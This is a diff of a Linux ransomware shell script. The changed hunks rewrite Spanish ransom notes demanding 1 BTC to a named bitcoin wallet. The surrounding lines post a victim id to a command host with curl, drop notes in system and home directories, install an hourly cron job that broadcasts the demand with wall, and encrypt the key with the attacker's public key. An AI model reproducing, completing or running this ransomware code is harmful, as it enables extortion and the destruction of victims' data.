@@ -256,7 +256,8 @@ curl -k -d "fileCount=${count}&uniqueId=${genKey}" https://192.168.1.132/count.p
 for directory in /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/
 do
   {
-    echo "Tus archivos han sido encriptados con RSA-4096. Para recuperarlos tienes que hacer un pago en los proximas 48 horas. Si no lo haces perderas toda la información. Además la consola se quedara inutilizable. No funciona que apagues o reinicies el sistema, por lo que tienes que pagar el rescate si o si. Realiza el pago de 1BTC y recuperaras la clave, la wallet en la que tienes que depositar los bitcoins es; 1MsktgD6XV1LNkBJLnTxEKs5F5hKkHNahr  https://192.168.1.132/decrypt.php and the id ${genKey}. Si no realizas el pago de 48 hours, tus datos se perderan para siempre."
+    echo "Tus archivos han sido encriptados con RSA-4096. Para recuperarlos tienes que hacer un pago en los proximas 48 horas. Si no lo haces perderas toda la información. Y la consola se quedara inutilizable. No funciona que apagues o reinicies el sistema, por lo que tienes que pagar el rescate si o si. Realiza el pago de 1BTC y recuperaras la clave, la wallet en la que tienes que depositar los bitcoins es; 1MsktgD6XV1LNkBJLnTxEKs5F5hKkHNahr 
+   Aqui encontraras la página para realizar el pago https://www.blockchain.com/ ${genKey}.
   } >> "${directory}/INSTRUCTIONS.txt"
 
   curl -k https://192.168.1.132/downloads/INSTRUCTIONS.html >> "${directory}/INSTRUCTIONS.html"
@@ -267,7 +268,8 @@ done
   echo -e "\n"
   echo -e "wallCmd=\$(which wall)"
   echo -e "\n"
-  echo -e "echo -e \"TUS ARCHIVOS SE HAN ENCRIPTADO CON RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever.\\n\\nIMPORTANT: DO NOT REBOOT YOUR SERVER. DO NOT ATTEMPT RECOVERY WITHOUT PURCHASING OUR DECRYPTION SOFTWARE. IF YOU DO SO, SYSTEM RECOVERY WILL BECOME IMPOSSIBLE.\" | \${wallCmd}"
+  echo -e "echo -e \"Tus archivos han sido encriptados con RSA-4096. Para recuperarlos tienes que hacer un pago en los proximas 48 horas. Si no lo haces perderas toda la información. Y la consola se quedara inutilizable. No funciona que apagues o reinicies el sistema, por lo que tienes que pagar el rescate si o si. Realiza el pago de 1BTC y recuperaras la clave, la wallet en la que tienes que depositar los bitcoins es; 1MsktgD6XV1LNkBJLnTxEKs5F5hKkHNahr 
+   Aqui encontraras la página para realizar el pago https://www.blockchain.com/  ${genKey}. .\\n\\nIMPORTANT: Pay" | \${wallCmd}"
 } > /etc/cron.hourly/instructions.sh
 
 chmod 755 /etc/cron.hourly/instructions.sh
@@ -282,7 +284,8 @@ else
   echo "Could not set crontab" &>/dev/null
 fi
 
-echo -e "TUS ARCHIVOS SE HAN ENCRIPTADO CON RSA-4096. Se han generado claves en nuestro servidor. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever.\n\nIMPORTANT: DO NOT REBOOT YOUR SERVER. DO NOT ATTEMPT RECOVERY WITHOUT PURCHASING OUR DECRYPTION SOFTWARE. IF YOU DO SO, SYSTEM RECOVERY WILL BECOME IMPOSSIBLE."
+echo -e "Tus archivos han sido encriptados con RSA-4096. Para recuperarlos tienes que hacer un pago en los proximas 48 horas. Si no lo haces perderas toda la información. Y la consola se quedara inutilizable. No funciona que apagues o reinicies el sistema, por lo que tienes que pagar el rescate si o si. Realiza el pago de 1BTC y recuperaras la clave, la wallet en la que tienes que depositar los bitcoins es; 1MsktgD6XV1LNkBJLnTxEKs5F5hKkHNahr 
+   Aqui encontraras la página para realizar el pago https://www.blockchain.com/"
 
 # Encrypt key.bin with our public key
 openssl rsautl -encrypt -inkey /root/pub.pem -pubin -in /root/key.bin -out /root/key.bin.enc
